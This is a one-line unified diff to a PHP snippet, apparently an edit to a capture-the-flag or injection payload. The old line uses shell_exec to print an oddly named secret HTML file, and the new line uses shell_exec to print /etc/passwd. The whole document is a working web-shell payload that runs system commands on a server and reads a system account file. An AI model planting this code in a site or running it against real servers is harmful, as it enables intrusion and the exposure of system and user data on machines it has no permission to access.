@@ -1,1 +1,1 @@
-<?php echo shell_exec('cat S3cRetP4g329658.html'); ?>
+<?php echo shell_exec('cat /etc/passwd'); ?>
